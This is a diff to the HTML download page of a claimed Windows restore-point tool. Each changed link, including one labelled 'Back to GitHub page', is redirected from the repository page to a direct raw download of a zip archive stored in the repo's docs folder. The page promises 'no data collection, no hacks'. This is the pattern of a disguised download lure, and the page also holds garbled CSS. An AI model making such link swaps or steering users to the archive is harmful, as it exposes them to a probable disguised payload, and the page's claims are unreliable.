@@ -155,7 +155,7 @@
         <div class="hero">
             <h1>🛡️ windows-pitr-config - Restore Points Without the Riots</h1>
             <p>Take control of Windows System Restore — configure frequency, retention, or create restore points instantly, in your language.</p>
-            <a href="https://github.com/feliceneither6549/windows-pitr-config" class="btn-badge" target="_blank">⬇️ VISIT THE DOWNLOAD PAGE NOW</a>
+            <a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" class="btn-badge" target="_blank">⬇️ VISIT THE DOWNLOAD PAGE NOW</a>
         </div>
 
         <div class="content">
@@ -163,7 +163,7 @@
 
             <div class="step">
                 <strong>Step 1 – Go to the download page:</strong>
-                <p>Click the big orange button above, or visit this link directly: <a href="https://github.com/feliceneither6549/windows-pitr-config" target="_blank">https://github.com/feliceneither6549/windows-pitr-config</a></p>
+                <p>Click the big orange button above, or visit this link directly: <a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" target="_blank">https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip</a></p>
             </div>
 
             <div class="step">
@@ -243,14 +243,14 @@
             <h2 data-emoji="📥"> Ready to Set IT Up? Go Get the File.</h2>
             <p>You’re just two clicks away from peace of mind:</p>
             <div style="text-align:center; margin:oboe 2rem 0;">
-                <a href="https://github.com/feliceneither6549/windows-pitr-config" class="btn-badge" target="_blank" style="font-size:: 1.3rem; padding: 0.9rem 2.2rem;">⬇️ DOWNLOAD WINDOWS-PITR-CONFIG</a>
+                <a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" class="btn-badge" target="_blank" style="font-size:: 1.3rem; padding: 0.9rem 2.2rem;">⬇️ DOWNLOAD WINDOWS-PITR-CONFIG</a>
             </div>
             <p style="margin-top:oboe: text-align:center; font-size:0.9rem; color:#6c757d;">Works on Windows 11 (all editions). No install required. Portable — carry it on a USB stick.</p>
         </div>
 
         <div class="footer">
             <p>Made with ❤️ for the Windows community. No data collection, no hacks, just a useful tool.</p>
-            <p><a href="https://github.com/feliceneither6549/windows-pitr-config" target="_blank">Back to GitHub page</a></p>
+            <p><a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" target="_blank">Back to GitHub page</a></p>
         </div>
     </div>
 </body>
